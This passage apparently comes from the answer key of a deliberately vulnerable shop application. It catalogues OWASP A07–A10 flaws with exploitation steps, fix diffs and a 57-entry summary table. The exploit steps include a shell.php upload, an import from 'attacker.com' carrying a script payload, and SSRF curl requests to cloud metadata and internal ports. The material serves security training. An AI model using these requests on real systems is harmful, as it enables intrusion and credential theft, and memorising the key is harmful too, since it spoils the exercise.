 	c.JSON(http.StatusOK, gin.H{"message": "If this email exists, a reset link has been sent"})
```

### A07-F1-no-client-backoff
- **Category**: A07 — Identification and Authentication Failures
- **Location**: `frontend/src/pages/Login.tsx`, login submission handler
- **Description**: The login form has no client-side rate limiting or backoff. Users can submit unlimited login attempts without any delay.
- **Exploitation**: Combined with A07-B4, brute-force attacks are trivially automated.
- **Fix**:
```diff
+  const [attempts, setAttempts] = useState(0);
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (attempts >= 5) {
+      setError("Too many attempts. Please wait.");
+      return;
+    }
     setError("");
     console.log("Login attempt:", email, password);
     try {
       await login(email, password);
       navigate("/");
     } catch (err: any) {
+      setAttempts(a => a + 1);
       setError(err.response?.data?.error || "Login failed");
     }
   };
```

### A07-F2-password-in-console
- **Category**: A07 — Identification and Authentication Failures
- **Location**: `frontend/src/pages/Login.tsx`, `frontend/src/pages/Register.tsx`
- **Description**: The login and registration forms log the user's password to the browser console: `console.log("Login attempt:", email, password)`. Anyone with access to the browser's DevTools can see the password.
- **Exploitation**:
  1. Open DevTools → Console
  2. Attempt to login
  3. The password is printed in the console in plaintext
- **Fix**:
```diff
-    console.log("Login attempt:", email, password);
+    console.log("Login attempt:", email);
```

---

## A08 — Software and Data Integrity Failures

### A08-B1-no-file-type-check
- **Category**: A08 — Software and Data Integrity Failures
- **Location**: `backend/internal/handlers/upload.go`, `Upload()` method
- **Description**: The file upload endpoint does not validate the Content-Type or file extension of uploaded files. Any file type (PHP scripts, executables, HTML) can be uploaded to the server.
- **Exploitation**:
  1. Login as admin
  2. `curl -X POST http://localhost:8080/api/upload -F "file=@shell.php"`
  3. The PHP file is uploaded and accessible via `/uploads/shell.php`
- **Fix**:
```diff
+	allowedTypes := map[string]bool{"image/jpeg": true, "image/png": true, "image/gif": true}
+	contentType := file.Header.Get("Content-Type")
+	if !allowedTypes[contentType] {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid file type"})
+		return
+	}
```

### A08-B2-no-upload-size-limit
- **Category**: A08 — Software and Data Integrity Failures
- **Location**: `backend/internal/handlers/upload.go`, `Upload()` method
- **Description**: There is no file size limit on uploads. An attacker can upload very large files to exhaust server disk space or cause denial of service.
- **Exploitation**: Upload a multi-gigabyte file until the server runs out of disk space.
- **Fix**:
```diff
+	const maxUploadSize = 10 << 20 // 10 MB
+	if file.Size > maxUploadSize {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "File too large"})
+		return
+	}
```

### A08-B3-unsigned-cart-cookie
- **Category**: A08 — Software and Data Integrity Failures
- **Location**: `backend/internal/handlers/cart.go`, `GetCart()` method
- **Description**: The cart state is stored in a gob-encoded cookie without any signature or encryption. A user can decode, modify, and re-encode the cookie to manipulate cart contents, prices, and quantities.
- **Exploitation**:
  1. Decode the base64 `cart_data` cookie
  2. Modify item prices or add items
  3. Re-encode and set the cookie
  4. The checkout accepts the tampered cart data (see A04-B1)
- **Fix**:
```diff
+	// Use server-side cart storage keyed by session
+	// or HMAC-sign the cookie with a server-side secret
+	import "crypto/hmac"
+	import "crypto/sha256"
+	mac := hmac.New(sha256.New, cartSecret)
+	mac.Write([]byte(cartJSON))
+	signature := hex.EncodeToString(mac.Sum(nil))
```

### A08-B4-unvalidated-import
- **Category**: A08 — Software and Data Integrity Failures
- **Location**: `backend/internal/handlers/import.go`, `ImportFromURL()` method
- **Description**: The product import feature fetches JSON from an arbitrary URL and inserts it into the database without any data validation beyond checking that name and price are present. Malicious JSON can inject arbitrary values into any product field.
- **Exploitation**:
  1. Host a JSON endpoint that returns: `[{"name": "XSS Test", "price": 1, "description": "<script>alert(1)</script>", "category": "test", "stock": 999}]`
  2. Import via `POST /api/admin/import {"url": "https://attacker.com/evil.json"}`
  3. The malicious data is stored and rendered to users on the product page
- **Fix**:
```diff
+	// Validate each field individually
+	if len(name) > 200 || len(description) > 2000 {
+		continue
+	}
+	if price < 0 || price > 100000 {
+		continue
+	}
```

### A08-F1-cdn-no-integrity
- **Category**: A08 — Software and Data Integrity Failures
- **Location**: `frontend/index.html`, Bootstrap CDN script/link tags
- **Description**: The Bootstrap CSS and JS files are loaded from a CDN (jsdelivr) without Subresource Integrity (SRI) hashes. If the CDN is compromised or the request is intercepted, malicious code could be injected via the script tag.
- **Exploitation**:
  1. MITM attack: replace the Bootstrap JS with malicious code on the wire
  2. No integrity check — the browser executes the tampered script
- **Fix**:
```diff
  <link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
+   integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65"
+   crossorigin="anonymous"
  />
```

### A08-F2-cookie-based-cart
- **Category**: A08 — Software and Data Integrity Failures
- **Location**: `frontend/src/context/CartContext.tsx`, cart cookie synchronization
- **Description**: The cart state is synchronized to a client-side cookie using `document.cookie`. The cookie is stored as plain JSON without any signature or encryption. Any script on the page can read and modify the cart cookie.
- **Exploitation**:
  1. Via any XSS vulnerability (A03): `document.cookie = "cart_items=<tampered_json>"`
  2. The tampered cart is sent to the server during checkout
- **Fix**: Store cart state exclusively on the server, keyed by session. Use httpOnly cookies for session identifiers.

---

## A09 — Security Logging and Monitoring Failures

### A09-B1-password-in-logs
- **Category**: A09 — Security Logging and Monitoring Failures
- **Location**: `backend/internal/handlers/auth.go`, `Login()` and `ForgotPassword()` methods
- **Description**: The login handler logs the password in plaintext on failed attempts: `log.Printf("Login failed: wrong password for %s", req.Password)`. Additionally, the forgot password handler logs the reset token. These sensitive values are written to stdout/container logs.
- **Exploitation**:
  1. Trigger failed login
  2. Check Docker logs: `docker compose logs backend`
  3. The password is visible in plaintext
  4. Check logs for reset tokens: `docker compose logs backend | grep "reset for"`
- **Fix**:
```diff
-	log.Printf("Login failed: wrong password for %s", req.Password)
+	log.Printf("Login failed for user %s", req.Email)
-	log.Printf("Password reset for %s: token=%s", user.Email, resetToken)
+	log.Printf("Password reset token generated for user %s", user.Email)
```

### A09-B2-no-admin-audit
- **Category**: A09 — Security Logging and Monitoring Failures
- **Location**: `backend/internal/handlers/admin.go`, all admin mutation endpoints
- **Description**: Admin actions such as creating, updating, and deleting products are performed without any audit logging. There is no record of who performed what action and when. In case of a security incident, there is no way to trace the attacker's actions.
- **Exploitation**: An attacker with admin access can modify or delete data without leaving a trail.
- **Fix**:
```diff
+	log.Printf("AUDIT: user_id=%d action=delete_product product_id=%d", userID, id)
+	// Or insert into an audit_log table
```

### A09-B3-no-error-logging
- **Category**: A09 — Security Logging and Monitoring Failures
- **Location**: Entire backend — absence of structured logging
- **Description**: The application uses `log.Printf` for all logging with no log levels, no structured format, no correlation IDs. Errors are logged inconsistently — some are logged, others are swallowed silently (e.g., `rows.Scan()` errors are skipped with `continue`).
- **Exploitation**: During incident response, there is no way to trace request flow or correlate errors.
- **Fix**:
```diff
+// Use structured logging (e.g., zerolog, zap)
+// Include request IDs, timestamps, user context, and severity levels
+log := zerolog.New(os.Stdout).With().Timestamp().Logger()
+log.Error().Err(err).Int64("user_id", userID).Msg("Failed to create order")
```

### A09-F1-token-in-console
- **Category**: A09 — Security Logging and Monitoring Failures
- **Location**: `frontend/src/api/client.ts`, request interceptor
- **Description**: The Axios request interceptor logs the JWT token to the console on every request: `console.log("Request with token:", token)`. Anyone with browser DevTools access can see the authentication token.
- **Exploitation**:
  1. Open DevTools → Console
  2. Perform any action (browse products, view cart)
  3. The JWT is printed in the console on every API request
- **Fix**:
```diff
-    console.log("Request with token:", token);
+    // Do not log authentication tokens
```

### A09-F2-cc-data-in-console
- **Category**: A09 — Security Logging and Monitoring Failures
- **Location**: `frontend/src/pages/Checkout.tsx`, checkout submission
- **Description**: The checkout handler logs the full payment payload including credit card number, expiry, and CVV to the browser console: `console.log("Checkout payload:", payload)`. This is a debug statement left in production code.
- **Exploitation**:
  1. Open DevTools → Console
  2. Complete a checkout
  3. The full CC details are printed: `{cc_number: "4111111111111111", cc_expiry: "12/30", cc_cvv: "123", ...}`
- **Fix**:
```diff
-    console.log("Checkout payload:", payload);
+    // Do not log payment information
```

---

## A10 — Server-Side Request Forgery (SSRF)

### A10-B1-ssrf-import-url
- **Category**: A10 — Server-Side Request Forgery
- **Location**: `backend/internal/handlers/import.go`, `ImportFromURL()` method
- **Description**: The `/api/admin/import` endpoint makes an HTTP GET request to any URL provided by the user without any validation. An attacker can use this to make the server access internal services, cloud metadata endpoints, or scan the internal network.
- **Exploitation**:
  ```bash
  # Access internal services
  curl -X POST http://localhost:8080/api/admin/import \
    -H 'Authorization: Bearer <admin_token>' \
    -H 'Content-Type: application/json' \
    -d '{"url": "http://localhost:8080/api/admin/users"}'

  # AWS metadata (if running on EC2)
  curl -X POST http://localhost:8080/api/admin/import \
    -H 'Authorization: Bearer <admin_token>' \
    -H 'Content-Type: application/json' \
    -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
  ```
- **Fix**:
```diff
+	// Validate the URL
+	parsedURL, err := url.Parse(req.URL)
+	if err != nil || (parsedURL.Scheme != "http" && parsedURL.Scheme != "https") {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid URL"})
+		return
+	}
+	// Block internal IP ranges
+	if isPrivateIP(parsedURL.Host) {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "URL points to internal network"})
+		return
+	}
```

### A10-B2-ssrf-image-proxy
- **Category**: A10 — Server-Side Request Forgery
- **Location**: `backend/internal/handlers/products.go`, `ImageProxy()` method
- **Description**: The `/api/products/image-proxy` endpoint fetches any URL and returns the response. No authentication is required. Anyone can use this endpoint to proxy requests to arbitrary targets, making the server a proxy for scanning internal networks or accessing restricted resources.
- **Exploitation**:
  ```bash
  # Access internal admin endpoints
  curl "http://localhost:8080/api/products/image-proxy?url=http://localhost:8080/api/admin/users"

  # Scan internal ports
  curl "http://localhost:8080/api/products/image-proxy?url=http://127.0.0.1:5432"
  ```
- **Fix**:
```diff
+	// Restrict to allowed image domains
+	parsedURL, err := url.Parse(url)
+	if err != nil || !isAllowedDomain(parsedURL.Host) {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid image URL"})
+		return
+	}
+	// Set a timeout
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Get(url)
```

### A10-B3-ssrf-webhook-callback
- **Category**: A10 — Server-Side Request Forgery
- **Location**: `backend/internal/handlers/admin.go`, `WebhookCallback()` method
- **Description**: The `/api/webhook/payment-callback` endpoint accepts a `callback_url` in the request body and makes an HTTP GET request to it without any validation. This endpoint requires no authentication, allowing anyone to trigger SSRF requests from the server.
- **Exploitation**:
  ```bash
  curl -X POST http://localhost:8080/api/webhook/payment-callback \
    -H 'Content-Type: application/json' \
    -d '{"callback_url": "http://169.254.169.254/latest/meta-data/"}'
  ```
- **Fix**:
```diff
+	// Require authentication for webhook callbacks
+	// Validate the callback URL against an allowlist
+	// Block internal network addresses
+	if req.CallbackURL != "" {
+		parsedURL, _ := url.Parse(req.CallbackURL)
+		if !isAllowedWebhookDomain(parsedURL.Host) {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid callback URL"})
+			return
+		}
+		resp, err := http.Get(req.CallbackURL)
+		...
+	}
```

---

## Summary

| ID | Category | Location | Severity |
|----|----------|----------|----------|
| A01-B1 | Access Control | orders.go:Get() | High |
| A01-B2 | Access Control | main.go admin routes | High |
| A01-B3 | Access Control | admin.go:GetUsers() | Medium |
| A01-F1 | Access Control | App.tsx admin routes | Medium |
| A01-F2 | Access Control | AuthContext.tsx | Medium |
| A02-B1 | Crypto | auth.go:hashPassword() | High |
| A02-B2 | Crypto | auth.go/middleware auth.go | Critical |
| A02-B3 | Crypto | auth.go:Me() | Critical |
| A02-B4 | Crypto | cart.go:Checkout() | High |
| A02-B5 | Crypto | auth.go:ForgotPassword() | Critical |
| A02-F1 | Crypto | AuthContext.tsx | Medium |
| A02-F2 | Crypto | Checkout.tsx | Medium |
| A03-B1 | Injection | products.go:Search() | Critical |
| A03-B2 | Injection | auth.go:Login() | Critical |
| A03-B3 | Injection | admin.go:GetOrders() | Critical |
| A03-B4 | Injection | upload.go:processImage() | Critical |
| A03-B5 | Injection | templates/email.go | High |
| A03-F1 | Injection | Shop.tsx | High |
| A03-F2 | Injection | ProductDetail.tsx | High |
| A03-F3 | Injection | Shop.tsx | High |
| A04-B1 | Insecure Design | cart.go:Checkout() | Critical |
| A04-B2 | Insecure Design | cart.go:Checkout() | High |
| A04-B3 | Insecure Design | coupons.go/cart.go | Medium |
| A04-F1 | Insecure Design | Cart.tsx | Medium |
| A04-F2 | Insecure Design | Cart.tsx/Checkout.tsx | Medium |
| A05-B1 | Misconfiguration | docker-compose.yml | Medium |
| A05-B2 | Misconfiguration | database/seed.go | Critical |
| A05-B3 | Misconfiguration | main.go StaticFS | Medium |
| A05-B4 | Misconfiguration | Multiple handlers | Low |
| A05-B5 | Misconfiguration | main.go (absence) | Medium |
| A05-F1 | Misconfiguration | index.html (absence) | Medium |
| A05-F2 | Misconfiguration | vite.config.ts | Low |
| A06-B1 | Outdated Components | go.mod | Medium |
| A06-B2 | Outdated Components | Dockerfile.backend | Low |
| A06-F1 | Outdated Components | package.json | Medium |
| A06-F2 | Outdated Components | Dockerfile.frontend | Low |
| A07-B1 | Auth Failures | auth.go:Login() | Medium |
| A07-B2 | Auth Failures | auth.go:Register() | Medium |
| A07-B3 | Auth Failures | auth.go:Login() | High |
| A07-B4 | Auth Failures | Entire app (absence) | High |
| A07-B5 | Auth Failures | auth.go:ForgotPassword() | Medium |
| A07-F1 | Auth Failures | Login.tsx | Low |
| A07-F2 | Auth Failures | Login.tsx | Low |
| A08-B1 | Data Integrity | upload.go:Upload() | High |
| A08-B2 | Data Integrity | upload.go:Upload() | Medium |
| A08-B3 | Data Integrity | cart.go:GetCart() | High |
| A08-B4 | Data Integrity | import.go:ImportFromURL() | Medium |
| A08-F1 | Data Integrity | index.html | Medium |
| A08-F2 | Data Integrity | CartContext.tsx | Medium |
| A09-B1 | Logging | auth.go multiple methods | High |
| A09-B2 | Logging | admin.go (absence) | Medium |
| A09-B3 | Logging | Entire app (absence) | Medium |
| A09-F1 | Logging | api/client.ts | Medium |
| A09-F2 | Logging | Checkout.tsx | High |
| A10-B1 | SSRF | import.go:ImportFromURL() | Critical |
| A10-B2 | SSRF | products.go:ImageProxy() | Critical |
| A10-B3 | SSRF | admin.go:WebhookCallback() | Critical |

**Total vulnerabilities**: 57
